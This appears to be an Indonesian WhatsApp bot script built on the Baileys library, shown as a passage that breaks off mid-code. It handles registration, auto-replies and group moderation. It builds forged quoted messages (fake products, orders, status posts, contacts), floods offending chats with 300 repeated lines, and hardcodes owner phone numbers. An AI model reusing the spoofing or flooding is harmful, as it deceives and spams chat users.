// SC BY X - Dev Team
// JANGAN DIPERJUAL BELIKAN !

const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		apikey, 
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const hx = require('hxz-api')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const crypto = require('crypto')
const axios = require("axios")
const util = require('util')
const os = require('os')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const { simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { addCommands, checkCommands, deleteCommands } = require('./lib/commands')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const { help, help2 } = require('./message')

let _registered = JSON.parse(fs.readFileSync('./database/pengguna.json'))
let _scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
let antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
let commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
let setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
let audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
let imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
let videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
let bancht = JSON.parse(fs.readFileSync('./database/banchat.json'))
let antidelete = JSON.parse(fs.readFileSync('./database/antidelete.json'))
let antideletepc = JSON.parse(fs.readFileSync('./database/ct-revoked.json'))
let samih = JSON.parse(fs.readFileSync('./database/simi.json'))

banChats = true
offline = false
targetpc = '0'
ownerNumber = ["6287729860010@s.whatsapp.net", "6288806066502@s.whatsapp.net"]
fake = '𝑪𝑹𝑬𝑨𝑻𝑶𝑹 𝑩𝑶𝑻\n𝐻𝑎𝑚 - 𝐵𝑜𝑡𝑧𝑧'
fake1 = '𝐻𝑎𝑚 - 𝐵𝑜𝑡𝑧𝑧'
numbernye = '0'
waktu = '-'
alasan = '-'
hit_today = []
antidel = true

/////***𝙁𝙐𝙉𝙏𝙄𝙊𝙉 𝘼𝘿𝘿 𝘾𝙈𝘿 & 𝘿𝙀𝙇𝙀𝙏𝙀***\\\\\
 var _0x7dfa=["\x70\x75\x73\x68","\x2E\x2F\x64\x61\x74\x61\x62\x61\x73\x65\x2F\x73\x63\x6F\x6D\x6D\x61\x6E\x64\x2E\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x77\x72\x69\x74\x65\x46\x69\x6C\x65\x53\x79\x6E\x63","\x69\x64","\x66\x6F\x72\x45\x61\x63\x68","\x6B\x65\x79\x73","\x63\x68\x61\x74\x73"];const addCmd=(_0x69b2x2,_0x69b2x3)=>{const _0x69b2x4={id:_0x69b2x2,chats:_0x69b2x3};_scommand[_0x7dfa[0]](_0x69b2x4);fs[_0x7dfa[3]](_0x7dfa[1],JSON[_0x7dfa[2]](_scommand))};const getCommandPosition=(_0x69b2x2)=>{let _0x69b2x6=null;Object[_0x7dfa[6]](_scommand)[_0x7dfa[5]]((_0x69b2x7)=>{if(_scommand[_0x69b2x7][_0x7dfa[4]]=== _0x69b2x2){_0x69b2x6= _0x69b2x7}});if(_0x69b2x6!== null){return _0x69b2x6}};const getCmd=(_0x69b2x2)=>{let _0x69b2x6=null;Object[_0x7dfa[6]](_scommand)[_0x7dfa[5]]((_0x69b2x7)=>{if(_scommand[_0x69b2x7][_0x7dfa[4]]=== _0x69b2x2){_0x69b2x6= _0x69b2x7}});if(_0x69b2x6!== null){return _scommand[_0x69b2x6][_0x7dfa[7]]}};const checkSCommand=(_0x69b2x2)=>{let _0x69b2xa=false;Object[_0x7dfa[6]](_scommand)[_0x7dfa[5]]((_0x69b2x7)=>{if(_scommand[_0x69b2x7][_0x7dfa[4]]=== _0x69b2x2){_0x69b2xa= true}});return _0x69b2xa}

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat malam 🌃'
                                        }
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat senja 🌆'
                                         }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat sore 🌆'
                                         }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat siang 🏙️'
                                         }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat pagi 🌇'
                                         }
if(time2 < "06:00:00"){
var ucapanWaktu = 'Selamat pagi 🌅'                                      
										}
// FUNCTION RISGETERED
const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }

        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/pengguna.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
        
//=================================================//
module.exports = xdev = async (xdev, dev, battery) => {
	try {
        if (!dev.hasNewMessage) return
        dev = dev.messages.all()[0]
		if (!dev.message) return
		if (dev.key && dev.key.remoteJid == 'status@broadcast') return
		global.blocked
        	dev.message = (Object.keys(dev.message)[0] === 'ephemeralMessage') ? dev.message.ephemeralMessage.message : dev.message
		xdev.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
		global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
		if (json[2][0][1].live == 'true') charging = true
		if (json[2][0][1].live == 'false') charging = false
	    })
		global.batrei = global.batrei ? global.batrei : []
		xdev.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
	    })
        	const content = JSON.stringify(dev.message)
		const from = dev.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
               
               //MengAutoRespon
               const type = Object.keys(dev.message)[0]        
               var pes = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
		       const messagesC = pes.slice(0).trim()

                const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
                const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        body = (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption.startsWith(prefix) ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption.startsWith(prefix) ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text.startsWith(prefix) ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== undefined) ? (getCmd(dev.message.stickerMessage.fileSha256.toString('hex')).startsWith(prefix) ? getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) : '') : ""
		budy = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        button = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedDisplayText : ''
        isImage = (type === 'imageMessage')
        listmes = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
		hit_today.push(command)
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')

		const hour_now = moment().tz('Asia/Jakarta').format('HH:mm:ss')
		const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWit= moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWita = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
		const botNumber = xdev.user.jid
		const botNumberss = xdev.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = dev.key.fromMe ? xdev.user.jid : isGroup ? dev.participant : dev.key.remoteJid
		const isOwner = ownerNumber.includes(sender)
		const totalchat = await xdev.chats.all()
		const groupMetadata = isGroup ? await xdev.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBanchat = isGroup ? bancht.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const isVote = isGroup ? voting.includes(from) : false
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const AntiVirtex = isGroup ? antivirtex.includes(from) : false
        const conts = dev.key.fromMe ? xdev.user.jid : xdev.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = dev.key.fromMe ? xdev.user.name : conts.notify || conts.vname || conts.name || '-'
		const isRegistered = checkRegisteredUser(sender)
        chatss = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
		isAntiDeletePc = antideletepc.includes(from)
		isAntiDelete = isGroup ? antidelete.includes(from) : false
		const isSimi = isGroup ? samih.includes(from) : false

//-----------------------------< DATE & TIME >----------------------------------
var dates = moment().tz('Asia/Jakarta').format("YYYY-MM-DDTHH:mm:ss");
var date = new Date(dates);
var tahun = date.getFullYear();
var bulan1 = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var haris = date.getDay();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var waktoo = date.getHours();

switch(hari) {
case 0: hari = "Minggu"; break;
case 1: hari = "Senin"; break;
case 2: hari = "Selasa"; break;
case 3: hari = "Rabu"; break;
case 4: hari = "Kamis"; break;
case 5: hari = "Jum`at"; break;
case 6: hari = "Sabtu"; break;
}
switch(bulan1) {
case 0: bulan1 = "Januari"; break;
case 1: bulan1 = "Februari"; break;
case 2: bulan1 = "Maret"; break;
case 3: bulan1 = "April"; break;
case 4: bulan1 = "Mei"; break;
case 5: bulan1 = "Juni"; break;
case 6: bulan1 = "Juli"; break;
case 7: bulan1 = "Agustus"; break;
case 8: bulan1 = "September"; break;
case 9: bulan1 = "Oktober"; break;
case 10: bulan1 = "November"; break;
case 11: bulan1 = "Desember"; break;
}
switch(waktoo){
case 0: waktoo = "Malam"; break;
case 1: waktoo = "Malam"; break;
case 2: waktoo = "Malam"; break;
case 3: waktoo = "Malam"; break;
case 4: waktoo = "Pagi"; break;
case 5: waktoo = "Pagi"; break;
case 6: waktoo = "Pagi"; break;
case 7: waktoo = "Pagi"; break;
case 8: waktoo = "Pagi"; break;
case 9: waktoo = "Pagi"; break;
case 10: waktoo = "Pagi"; break;
case 11: waktoo = "Siang"; break;
case 12: waktoo = "Siang"; break;
case 13: waktoo = "Siang"; break;
case 14: waktoo = "Siang"; break;
case 15: waktoo = "Sore"; break;
case 16: waktoo = "Sore"; break;
case 17: waktoo = "Sore"; break;
case 18: waktoo = "Sore"; break;
case 19: waktoo = "Malam"; break;
case 20: waktoo = "Malam"; break;
case 21: waktoo = "Malam"; break;
case 22: waktoo = "Malam"; break;
case 23: waktoo = "Malam"; break;
}
var Tanggal= "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
var Hari= "" + waktoo;
  


        //MESS
		mess = {
			wait: '*Tunggu bang loading...*_',
			admin: 'Perintah ini hanya bisa digunakan oleh Admin Grup',
			owner: 'Perintah ini hanya dapat digunakan oleh owner bot',
			succes: 'Done! ',
			noregis: '*「 PENDAFTARAN 」*\n\n*Cara daftar #daftar nama|umur* \n*contoh #Daftar udin|19*', 
			rediregis: '*「 SUDAH TERDAFTAR 」*\n\n*Kamu sudah terdaftar di database Bot*', 
			wrongf: '*Format salah/text kosong*', 
			registered: '*「 DATA NEGARA 𝐻𝑎𝑚𝐵𝑜𝑡𝑧 」*\n\nkamu sudah terdaftar dengan data \n\n┏━⊱nama\n┗⊱${namaUser}\n┏━⊱nomer\n┗⊱wa.me/${sender.split("@")[0]}\n┏━⊱umur\n┗⊱${umurUser}\n┏━⊱waktu pendaftaran\n┗⊱${time}\n\n┏━❉ *NS* ❉━\n┣⊱${serialUser}\n┗⊱NOTE : jangan sampai lupa nomer ini karena ini penting! katanya:V', 
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'bukan sticker itu:v',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Perintah ini hanya bisa digunakan di grup',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        //FAKEREPLY PRODUCT
            const ftoko = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./stik/thumb.jpeg`)},"title": `NGEJUDI GAK BROH?\n${pushname}`,"description": "𝐻𝑎𝑚 - 𝐵𝑜𝑡𝑧𝑧", "currencyCode": "IDR","priceAmount1000": "9999999999","retailerId": "𝐻𝑎𝑚 - 𝐵𝑜𝑡𝑧𝑧","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
            //FAKE KONTAK
            const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
            const fvn = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}
            //FAKE TEXT
            const ftext = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE LIVE ACTION
            const floc2 = {
                  key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
            //FAKEREPLY TROLI
            const ftroli = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 696969,status: 1,surface : 1,message: `${fake}`,orderTitle: 'Bang',thumbnail: fs.readFileSync('./stik/thumb.jpeg'), sellerJid: '0@s.whatsapp.net'}}}
            //FAKEREPLY VIDEO
            const fvideo = {
                  key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '-99999', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKEREPLY GROUPINVITE
            const fgc = {
                  key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKEREPLY GIF
            const fgif = {
                  key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}} 
            
        const reply = (text) => {
                xdev.sendMessage(from, text, MessageType.text, {contextInfo:{forwardingScore: 508, isForwarded: true}, quoted: dev, sendEphemeral: true ,thumbnail: fs.readFileSync(`./stik/thumb.jpeg`)})
        }
        const sendMess = (hehe, teks) => {
            xdev.sendMessage(hehe, teks, text)
        }
		const math = (teks) => {
				return Math.floor(teks)
		}
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? xdev.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": memberr } })
        }
        const fakestatus = (teks) => {
            xdev.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            xdev.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./stik/fake.jpeg'),quoted:dev,caption:yes})
        }
        const fakegroup = (teks) => {
            xdev.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        xdev.sendMessage(to, media, MessageType.sticker,{quoted:dev})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    xdev.sendMessage(to, media, type, { quoted: dev, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
            

            var chats = await xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
            chats.map( async ({ jid }) => {
            await xdev.chatRead(jid)
            })
            //AUTO RESPON
      for (let i = 0; i < commandsDB.length ; i++) {
      if (budy == commandsDB[i].pesan) {
      xdev.sendMessage(from, commandsDB[i].balasan, text, {quoted: dev})
      }
      }
            /////***𝙁𝙐𝙉𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄𝙇𝙄𝙉𝙆 𝙂𝙍𝙐𝙋***\\\\\
				if (budy.includes("https://chat.whatsapp.com/")) {
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply(` *「 GROUP LINK DETECTOR 」*\nKamu mengirimkan link grup chat, maaf kamu di kick dari grup :(`)
				setTimeout(() => {
				xdev.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
				}, 0)
			    }
			/////***𝙁𝙐𝙉𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙑𝙄𝙍𝙐𝙎***\\\\\
    if (budy.length > 3500) {
    if (!isGroup) return
    if (!AntiVirtex) return
    if (isGroupAdmins) return
    reply('Tandai telah dibaca\n'.repeat(300))
    reply(`「 *PETUGAS PEMBERSIH* 」\n\nKamu nakal si! Ngapain kirim virus? \nMaaf tapi aku harus mengeluarkan kamu...\nSelamat tingal~`)
    console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
    xdev.groupRemove(from, [sender])
    }

//============[ AUTO BLOCK SISTEM ]==================\\
            /*xdev.on('CB:action,,call', async json => {
            const callerId = json[2][0][1].from;
            console.log("call dari "+ callerId)
            xdev.sendMessage(callerId, "Auto block system, don't call please", MessageType.text)
            await sleep(1000)
            await xdev.blockUser(callerId, "add") // Block user
            })
	        xdev.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
      	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
    	    }
	        })*/
			xdev.on("CB:Call", json => {
		let call;
		calling = JSON.parse(JSON.stringify(json))
		call = calling[1].from
		setTimeout(function(){
			xdev.sendMessage(call, `Maaf, saya tidak bisa menerima panggilan. nelfon = block!.\nJika ingin membuka block harap chat Owner!\nhttps//wa.me/${ownerNumber}`, MessageType.text)
			.then(() => xdev.blockUser(call, "add"))
			}, 100);
		})
//FUNCTION
            cekafk(afk)
            if (!dev.key.remoteJid.endsWith('@g.us') && offline){
            if (!dev.key.fromMe){
            if (isAfk(dev.key.remoteJid)) return
            addafk(dev.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            xdev.sendMessage(dev.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
            }
            }   
        if (dev.key.remoteJid.endsWith('@g.us') && offline) {
        if (!dev.key.fromMe){
        if (dev.message.extendedTextMessage != undefined){
        if (dev.message.extendedTextMessage.contextInfo != undefined){
        if (dev.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of dev.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(dev.key.remoteJid)) return
        addafk(dev.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        xdev.sendMessage(dev.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
    
    // Yang Respon Itu Bang
   
    if (setiker.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/stick/${namastc}.webp`)
	xdev.sendMessage(from, buffer, sticker, {quoted:dev })
	}
	
	if (audionye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
	xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: dev, ptt: true })
	}
	
	if (imagenye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/foto/${namastc}jpeg`)
	xdev.sendMessage(from, buffer, image, {quoted : dev})
	}
	
	if (videonye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
	xdev.sendMessage(from, buffer, video, {quoted : dev})
	}
	
//******************* 》banchat《 ********************\\
if (isBanchat){
if (!isOwner) return
if (chatss.toLowerCase().startsWith('unbanchat')){
